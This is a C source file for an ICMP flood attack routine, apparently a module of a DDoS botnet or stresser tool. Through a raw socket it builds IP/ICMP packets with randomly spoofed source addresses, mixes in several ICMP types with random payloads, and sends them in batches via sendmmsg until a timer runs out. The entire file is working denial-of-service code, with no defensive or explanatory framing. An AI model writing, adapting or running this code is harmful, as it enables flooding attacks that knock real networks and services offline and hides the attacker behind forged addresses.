#define _GNU_SOURCE

#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <time.h>
#include <stdio.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <pthread.h>
#include <stdint.h>

#include "icmp_attack.h"
#include "../headers/protocol.h"

#define ICMP_MAX_PAYLOAD 65500
#define ICMP_DEFAULT_PAYLOAD 1400
#define BATCH 64

static inline uint64_t xorshift64(uint64_t *s) {
    uint64_t x = *s;
    x ^= x << 13;
    x ^= x >> 7;
    x ^= x << 17;
    return *s = x;
}

static uint16_t icmp_checksum(void* data, int len) {
    uint32_t sum = 0;
    uint16_t* ptr = (uint16_t*)data;

    while (len > 1) {
        sum += *ptr++;
        len -= 2;
    }

    if (len == 1) {
        sum += *(uint8_t*)ptr;
    }

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);

    return (uint16_t)(~sum);
}

void* icmp_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;

    attack_option* opt_psize = find_option(params, OPT_PSIZE);
    uint16_t psize = opt_psize ? get_option_u16(opt_psize) : ICMP_DEFAULT_PAYLOAD;
    if (psize > ICMP_MAX_PAYLOAD) psize = ICMP_MAX_PAYLOAD;
    if (psize < 8) psize = 8;

    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd < 0) return NULL;

    int opt = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt)) < 0) {
        close(fd);
        return NULL;
    }

    int sndbuf = 4 * 1024 * 1024;
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    size_t total_len = sizeof(struct iphdr) + sizeof(struct icmphdr) + psize;
    size_t icmp_len  = sizeof(struct icmphdr) + psize;

    /* Seed xorshift PRNG */
    uint64_t rng_state = (uint64_t)time(NULL) ^ ((uint64_t)getpid() << 32);
    if (rng_state == 0) rng_state = 0xDEADBEEFCAFEBABEULL;

    /* Pre-allocate batch of packets */
    char *pkt_buf = malloc(total_len * BATCH);
    if (!pkt_buf) {
        close(fd);
        return NULL;
    }

    struct mmsghdr msgs[BATCH];
    struct iovec iovs[BATCH];
    struct sockaddr_in dest;

    memset(&dest, 0, sizeof(dest));
    dest.sin_family      = AF_INET;
    dest.sin_addr.s_addr = params->target_addr.sin_addr.s_addr;

    uint8_t icmp_types[] = {ICMP_ECHO, ICMP_TIMESTAMP, ICMP_INFO_REQUEST, ICMP_ADDRESS};

    /* Fill random payload once — shared across all batch slots */
    for (int i = 0; i < BATCH; i++) {
        char *pkt = pkt_buf + (total_len * i);
        memset(pkt, 0, sizeof(struct iphdr) + sizeof(struct icmphdr));

        struct iphdr*  ip   = (struct iphdr*)pkt;
        struct icmphdr* icmp = (struct icmphdr*)(pkt + sizeof(struct iphdr));
        char* payload = pkt + sizeof(struct iphdr) + sizeof(struct icmphdr);

        /* Random payload fill */
        uint64_t r;
        for (uint16_t j = 0; j < psize; j += 8) {
            r = xorshift64(&rng_state);
            size_t remain = psize - j;
            memcpy(payload + j, &r, remain < 8 ? remain : 8);
        }

        /* IP header — constant fields */
        ip->version  = 4;
        ip->ihl      = 5;
        ip->tos      = 0;
        ip->tot_len  = htons(total_len);
        ip->frag_off = 0;
        ip->ttl      = 255;
        ip->protocol = IPPROTO_ICMP;
        ip->daddr    = params->target_addr.sin_addr.s_addr;

        /* ICMP header — defaults */
        icmp->type = ICMP_ECHO;
        icmp->code = 0;

        /* iov / msg setup */
        iovs[i].iov_base = pkt;
        iovs[i].iov_len  = total_len;

        memset(&msgs[i], 0, sizeof(msgs[i]));
        msgs[i].msg_hdr.msg_iov     = &iovs[i];
        msgs[i].msg_hdr.msg_iovlen  = 1;
        msgs[i].msg_hdr.msg_name    = &dest;
        msgs[i].msg_hdr.msg_namelen = sizeof(dest);
    }

    time_t end_time = time(NULL) + params->duration;
    uint64_t iter = 0;
    uint16_t seq = 0;

    while (params->active) {
        /* Update per-packet varying fields */
        for (int i = 0; i < BATCH; i++) {
            char *pkt = pkt_buf + (total_len * i);
            struct iphdr*   ip   = (struct iphdr*)pkt;
            struct icmphdr* icmp = (struct icmphdr*)(pkt + sizeof(struct iphdr));

            uint64_t r1 = xorshift64(&rng_state);
            uint64_t r2 = xorshift64(&rng_state);

            /* Spoof source IP — avoid 0.x.x.x and 224+ ranges */
            uint32_t sip = (uint32_t)r1;
            uint8_t first = (sip >> 24) & 0xFF;
            if (first == 0 || first >= 224) sip = ((first % 223) + 1) << 24 | (sip & 0x00FFFFFF);
            ip->saddr = sip;
            ip->id    = htons((uint16_t)(r1 >> 32));
            ip->check = 0;

            icmp->type            = icmp_types[i & 3];
            icmp->code            = 0;
            icmp->un.echo.id      = htons((uint16_t)(r2));
            icmp->un.echo.sequence = htons(seq++);
            icmp->checksum        = 0;
            icmp->checksum        = icmp_checksum(icmp, icmp_len);
        }

        sendmmsg(fd, msgs, BATCH, MSG_NOSIGNAL);

        if ((++iter & 0x3F) == 0 && time(NULL) >= end_time) break;
    }

    free(pkt_buf);
    close(fd);
    return NULL;
}
